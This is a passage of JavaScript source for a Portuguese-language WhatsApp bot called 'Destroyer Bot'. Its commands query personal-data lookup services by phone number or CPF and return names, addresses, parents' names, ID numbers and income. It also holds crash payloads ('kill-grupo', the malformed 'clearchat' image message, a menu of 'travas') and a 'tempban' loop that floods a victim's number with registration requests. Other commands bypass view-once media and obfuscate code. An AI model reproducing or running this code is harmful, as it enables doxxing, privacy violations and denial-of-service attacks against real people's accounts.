    return reply('Por favor, informe um telefone v√°lido. Exemplo: telefone2 61981287778');
  }

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/api/busca/telefone?apitoken=Verykibes%20Channel2025ofc&query=${tel}`;

    const response = await axios.get(url);
    const data = response?.data;

    if (!data || !data.status || !data.resultado) {
      return reply(`‚ùå Nenhuma informa√ß√£o encontrada para o telefone ${tel}`);
    }

    const resultado = data.resultado.replace(/\n/g, '').trim();

    const telefone = resultado.match(/TELEFONE:\s*(\d+)/i)?.[1] || 'Desconhecido';
    const nome = resultado.match(/NOME:\s*(.+?)CPF\/CNPJ:/i)?.[1]?.trim() || 'Desconhecido';
    const cpf = resultado.match(/CPF\/CNPJ:\s*(\d+)/i)?.[1] || 'Desconhecido';
    const logradouro = resultado.match(/LOGRADOURO:\s*(.+?)N√öMERO:/i)?.[1]?.trim() || 'Desconhecido';
    const numero = resultado.match(/N√öMERO:\s*(.+?)COMPLEMENTO:/i)?.[1]?.trim() || 'Desconhecido';
    const complemento = resultado.match(/COMPLEMENTO:\s*(.+?)BAIRRO:/i)?.[1]?.trim() || 'Desconhecido';
    const bairro = resultado.match(/BAIRRO:\s*(.+?)CIDADE:/i)?.[1]?.trim() || 'Desconhecido';
    const cidade = resultado.match(/CIDADE:\s*(.+?)ESTADO:/i)?.[1]?.trim() || 'Desconhecido';
    const estado = resultado.match(/ESTADO:\s*(.+?)CEP:/i)?.[1]?.trim() || 'Desconhecido';
    const cep = resultado.match(/CEP:\s*(\d+)/i)?.[1] || 'Desconhecido';

    const msg = `
üìû *Consulta por Telefone:*

üì± *Telefone:* ${telefone}
üë§ *Nome:* ${nome}
üÜî *CPF/CNPJ:* ${cpf}

üìç *Endere√ßo:*
üèòÔ∏è *Logradouro:* ${logradouro}, N¬∫ ${numero}
üè¢ *Complemento:* ${complemento}
üèôÔ∏è *Bairro:* ${bairro}
üåÜ *Cidade:* ${cidade} - ${estado}
üìÆ *CEP:* ${cep}
`.trim();

    return reply(msg);

  } catch (err) {
    console.error(err);
    return reply('‚ùå Ocorreu um erro ao consultar o telefone.');
  }
}
break;


case "cpf": {
  if (!isCreator) return reply(mess.prem)

  const cpfNumero = q.trim().replace(/\D/g, '');
  if (!cpfNumero || cpfNumero.length !== 11) {
      return reply("Por favor, informe um CPF v√°lido. Exemplo: cpf 21272557553");
  }

  try {
      const axios = require('axios');
      const url = `https://v0-painel-de-dados.vercel.app/api/consultas/cpf?cpf=${cpfNumero}`;
      const response = await axios.get(url, {
          headers: {
              'X-Api-Access': 'aescorp-panel-access'
          }
      });

      const data = response.data?.resultado;

      if (!data || !data.cpf) {
          return reply(`*Nenhuma informa√ß√£o sobre o CPF ${cpfNumero} encontrada.*`);
      }
      
      const result = `
üîç *Consulta por CPF:*
üë§ *Nome:* ${data.nome || "Desconhecido"}
üÜî *CPF:* ${data.cpf}
üìÖ *Nascimento:* ${data.data_nascimento || "Desconhecida"}
üë©‚Äçü¶≥ *M√£e:* ${data.nome_mae || "Desconhecida"}
üë® *Pai:* ${data.nome_pai || "N√£o informado"}
üìù *RG:* ${data.rg || "N√£o informado"} - ${data.orgao_emissor || ""}
üß¨ *Sexo:* ${data.sexo || "N√£o informado"}
üíç *Estado Civil:* ${data.estado_civil || "Desconhecido"}
üó≥Ô∏è *T√≠tulo de Eleitor:* ${data.titulo_eleitor || "Desconhecido"}
üåé *Nacionalidade:* ${data.nacionalidade || "N√£o informado"}
üí∞ *Renda:* R$ ${data.renda || "Desconhecida"}
      `.trim();

      reply(result);

  } catch (error) {
      console.error(error);
      reply("Erro ao consultar o CPF. Tente novamente mais tarde.");
  }
}
break;

case "kill-grupo": {
  if (!m.isGroup) return reply(`@${pushname}, esse comando s√≥ funciona em grupo`)
  if(!isCreator) return reply(mess.prem)
      try {
          for(let i = 0; i < 15; i++) {
            await buginvite(m.chat, { ptcp: !0 }, EsQl );
          }
          await uwu.sendMessage(m.chat, { text: "ùì´ùîÇ ùììùìÆùìºùìΩùìªùì∏ùîÇùìÆùìª ùìø0.1"} )
          // await uwu.groupLeave(isTarget);
  
      } catch (error) {
          reply(util.format(error));
      }
  }
break;

case "clearchat":
await uwu.relayMessage(m.chat, {
  'botInvokeMessage': {
      'message': {
          'messageContextInfo': {
              'deviceListMetadataVersion': 2,
              'deviceListMetadata': {}
          },
          'imageMessage': {
              'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m234/up-oil-image-e1bbfe2b-334b-4c5d-b716-d80edff29301?ccb=9-4&oh=01_Q5AaID0uZoxsi9v2I7KJZEgeJ7IVkFPZkt2yeYf6ps0IWG2g&oe=66E7130B&_nc_sid=000000&mms3=true",
              'mimetype': "image/png",
              'caption': "CHAT LIMPO ‚úÖ",
              'fileSha256': "YVuPx9PoIxL0Oc3xsUc3n3uhttmVYlqUV97LKKvIjL8=",
              'fileLength': "999999999",
              'height': 10000000000000000,
              'width': 99999999999999999999999,
              'mediaKey': "4T8WJKuKvJ9FXSwldCXe5+/IA7aYi5ycf301J0xIZwA=",
              'fileEncSha256': 'jfG3tesFLdqtCzO6cqU51HGGkEtd7+w22aJtaEm2yjE=',
              'directPath': "/v/t62.7118-24/29631950_1467571294644184_4827066390759523804_n.enc?ccb=11-4&oh=01_Q5AaIFPK_QoDRMR4vZIBbMTdy6GreGhSA2HHRAIu0-vAMgqN&oe=66E72F5E&_nc_sid=5e03e0",
              'mediaKeyTimestamp': '1723839207',
              'jpegThumbnail': "imagenMiniaturaBase64",
              'scansSidecar': "il8IxPgrhGdtn37jGMVgQVRKlPd/CERE+Nr822DZe2UT9r0YT3KPSQ==",
              'scanLengths': [5373, 24562, 15656, 22918],
              'midQualityFileSha256': "s8Li+/zg2VmzMvJtRAZHPVres8nAPEWcd11nK5b/keY="
          }
      },
      'expiration': 0,
      'ephemeralSettingTimestamp': "1723838053",
      'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "UNKNOWN",
          'initiatedByMe': true
      }
  }
}, {});
break

case 'verfoto': {
  if(!isCreator) return reply(mess.prem)
	if (!m.quoted) return reply(`*Selecione uma mensagem em visualiza√ß√£o √∫nica!*`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`*Isso n√£o √© uma mensagem em visaliza√ß√£o √∫nica!*`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return uwu.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return uwu.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break

case "tagall": {
  if (!m.isGroup) return reply(mess.grp)
  if (!isAdmins) return reply(mess.admin)
  // if (!text) return reply(`Coloque alggo`)
  let teks = "DESTROYER BOT TE CONVOCOU!\n"
  let member = await participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
  await member.forEach((e) => {
      teks += `@${e.split("@")[0]}\n`
  })
  await uwu.sendMessage(m.chat, {
      text: teks,
      mentions: [...member]
  }, {
      quoted: m
  })
}
break

case 'randfigu': {
  // if (!isCreator) return reply(mess.prem);

  try {
    const axios = require('axios');
    const url = 'https://pnsapis.online/api/figurinhas?apitoken=Verykibes%20Channel2025ofc';

    const response = await axios.get(url, { responseType: 'arraybuffer' });

    const buffer = Buffer.from(response.data, 'binary');

    await uwu.sendMessage(from, {
      sticker: buffer
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    return reply('‚ùå Ocorreu um erro ao buscar a figurinha aleat√≥ria.');
  }
}
break;

case 'menu': {

    const caption = `
‚ï≠‚îÅ‚îÅ‚ß´    ‚å§   ‚ß´‚îÅ‚îÅ‚ïÆ
‚îÉ ü§ñ Bot: *Privado*
‚îÉ üë§ Nome: *${global.botname}*
‚îÉ üõ† Vers√£o: *${global.botversion}*
‚îÉ üë®‚Äçüíª Criado por: *${global.ownername}*
‚îÉ ‚è≥ Tempo ativo: *${runtime(process.uptime())}*
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

Escolha um dos menus:
‚ï≠‚îÅ„Äî     ‚å§    „Äï‚îÅ‚ïÆ
‚îÉ ‚Ä¢  ${prefix}travas
‚îÉ ‚Ä¢  ${prefix}consultas
‚îÉ ‚Ä¢  ${prefix}geradores
‚îÉ ‚Ä¢  ${prefix}geral
‚îÉ ‚Ä¢  ${prefix}grupo
‚îÉ ‚Ä¢  ${prefix}alugarbot
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
`.trim()

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

case 'travas': {
  const caption = `
‚ï≠‚îÅ„Äî *ùì£ùì°ùìêùì•ùìêùì¢* „Äï‚îÅ‚ïÆ
‚îÉ ‚Ä¢ ‚ò†Ô∏è null
‚îÉ ‚Ä¢ üè† kill-grupo
‚îÉ ‚Ä¢ üöÄ bug
‚îÉ ‚Ä¢ üìç location
‚îÉ ‚Ä¢ üîï kill-notify
‚îÉ ‚Ä¢ üïí atraso
‚îÉ ‚Ä¢ üïí atrasostatus
‚îÉ ‚Ä¢ üì° protocolbug
‚îÉ ‚Ä¢ ‚úâÔ∏è convite
‚îÉ ‚Ä¢ üçé ios
‚îÉ ‚Ä¢ üéâ closeuiteste
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

case 'grupo': {
  const caption = `
‚ï≠‚îÅ„Äî *ùìñùì°ùì§ùìüùìû* „Äï‚îÅ‚ïÆ
‚îÉ ‚Ä¢ üîóantilink
‚îÉ ‚Ä¢ üìéantidoc
‚îÉ ‚Ä¢ üè∑Ô∏ètagall
‚îÉ ‚Ä¢ üéµplay
‚îÉ ‚Ä¢ üî®ban
‚îÉ ‚Ä¢ üíåcorreio
‚îÉ ‚Ä¢ üîîtotag
‚îÉ ‚Ä¢ üëãbemvindo
‚îÉ ‚Ä¢ üíënamorar
‚îÉ ‚Ä¢ ‚ùåcancelarpedido
‚îÉ ‚Ä¢ ü§ùdupla
‚îÉ ‚Ä¢ üíîterminar_namoro
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

// Menu CONSULTAS
case 'consultas': {
  const caption = `
‚ï≠‚îÅ„Äî *ùìíùìûùìùùì¢ùì§ùìõùì£ùìêùì¢* „Äï‚îÅ‚ïÆ
‚îÉ ‚Ä¢ üë§ nome
‚îÉ ‚Ä¢ üë§ nome2
‚îÉ ‚Ä¢ ü™™ cpf
‚îÉ ‚Ä¢ ü™™ cpf2
‚îÉ ‚Ä¢ üì± tel
‚îÉ ‚Ä¢ üì± tel2
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

// Menu GERADORES
case 'geradores': {
  const caption = `
‚ï≠‚îÅ„Äî *ùìñùìî‚Ñõùìêùììùìû‚Ñõùìîùì¢* „Äï‚îÅ‚ïÆ
‚îÉ ‚Ä¢ üöì pmrj
‚îÉ ‚Ä¢ üíâ sppni
‚îÉ ‚Ä¢ üîê credlink
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

// Menu GERAIS
case 'geral': {
  const caption = `
‚ï≠‚îÅ„Äî *ùìñùìîùì°ùìêùìõ* „Äï‚îÅ‚ïÆ
‚îÉ ‚Ä¢ üßπ clearchat
‚îÉ ‚Ä¢ üì∑ verfoto
‚îÉ ‚Ä¢ ‚è≥ tempban
‚îÉ ‚Ä¢ üìù nick
‚îÉ ‚Ä¢ üåê gethtml
‚îÉ ‚Ä¢ ‚ò¢Ô∏è nuke
‚îÉ ‚Ä¢ üñºÔ∏è plaq1-8
‚îÉ ‚Ä¢ ü§ñ randfigu
‚îÉ ‚Ä¢ üîê criptografar
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
`.trim();

  await uwu.sendMessage(m.chat, {
    image: fs.readFileSync('./luckzMedia/thumb.jpg'),
    caption,
    mentions: [m.sender],
    footer: `${global.botname} - ${global.botversion}`,
    headerType: 6
  }, { quoted: m });
}
break;

case 'dec': case 'decrypt': {
	if (isCreator) {
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return reply(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@luckzinios.js';
fs.writeFileSync(filePath, message.code);

await uwu.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @luckzinios'
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await reply(errorMessage);
}
} else {
    	return
    }
}
break;

case 'criptografar': {
    if (!isCreator) return reply(mess.prem)
    const JSConfuser = require("js-confuser");

    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return
    }

    try {
        let code;
        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
            }
            code = docBuffer.toString('utf-8');
        } else {
            code = text;
        }

        const optionsObf6 = {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            flatten: true,

            identifierGenerator: function() {
                const originalString =
                    "Á¥†Êô¥Â∫ßÁ¥†Êô¥Èõ£LUCKZINÁ¥†Êô¥Â∫ßÁ¥†Êô¥Èõ£" +
                    "Á¥†Êô¥Â∫ßÁ¥†Êô¥Èõ£LUCKZINÁ¥†Êô¥Â∫ßÁ¥†Êô¥Èõ£";

                function removeUnwantedChars(input) {
                    return input.replace(
                        /[^a-zA-ZÂ∫ßNandokukaÁ¥†Muzukashƒ´Á¥†Êô¥]/g, ''
                    );
                }

                function randomString(length) {
                    let result = '';
                    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                    const charactersLength = characters.length;

                    for (let i = 0; i < length; i++) {
                        result += characters.charAt(
                            Math.floor(Math.random() * charactersLength)
                        );
                    }
                    return result;
                }

                return removeUnwantedChars(originalString) + randomString(2);
            },

            renameVariables: true,
            renameGlobals: true,

            stringEncoding: true,
            stringSplitting: 0.0,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 1.0,

            shuffle: {
                hash: 0.0,
                true: 0.0
            },

            stack: true,
            controlFlowFlattening: 1.0,
            opaquePredicates: 0.9,
            deadCode: 0.0,
            dispatcher: true,
            rgf: true,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true
        };

        const options = {
            target: "node",
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.5,
            deadCode: 0.25,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: true,
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75,
            preserveFunctionLength: true,
            identifierGenerator: function() {
                return "luckzin_o_melhorzin" + Math.random().toString(36).substring(7);
            },
        };

        const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6, options);

        const filePath = './enc_by_@luckzinios.js';
        fs.writeFileSync(filePath, obfuscatedCode);

        await uwu.sendMessage(m.chat, {
            document: {
                url: filePath
            },
            mimetype: 'application/javascript',
            fileName: 'Encrypted By @luckzinios.js'
        }, {
            quoted: m
        });

    } catch (error) {
        const errorMessage = `There is an error: ${error.message}`;
        await reply(errorMessage);
    }
}
break

case 'tempban': 
{
  if(!isCreator) return reply(mess.prem)
  if(!text) return reply(`Exemplo: ${command} 489xxxxxxxx`)

    const alvo = `${text.replace(/[^0-9]/g,'')}`
    await reply(`Dando ban no ${alvo}. Aguarde.`)

    try{
      const {state} = await useMultiFileAuthState('./tempban')
      const spam = await makeWASocket({
        auth: state,
        mobile: true,
        logger: pino({level: 'silent'})
      })
      let tentativas = 0
      const maxTentativas = 100
      while(tentativas < moment.max) {
        try {
          const res = await spam.requestRegistrationCode({ phoneNumber: `+55${alvo}`,
            phoneNumberCountryCode: 55,
            phoneNumberNationalNumber: numero,
            phoneNumberMobileCountryCode: 724,
            method: 'sms'
          })
          tentativas++
          console.log(`${tentativas}/${maxTentativas} Tentando banir ${alvo}`)

          if(res.reason === 'temporarily_unavailable') {
            await uwu.sendMessage(m.chat, { text: `${alvo} Acabou de ser banido!`})
            break
          }
          await sleep(100)
        } catch(err) {
          console.log(`Erro na tentativa: ${tentativas}: ${err}`)
        }
      }
      if(tentativas >= maxTentativas) {
        await uwu.sendMessage(m.chat, { text: `Mandei os 100 spam! Pode acontecer de n√£o ter banido!!`})
      }
    } catch(err) {
      await uwu.sendMessage(m.chat, { text: `Erro ao banir ${alvo}, ${err.message}`})
    }
}
  
default:
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})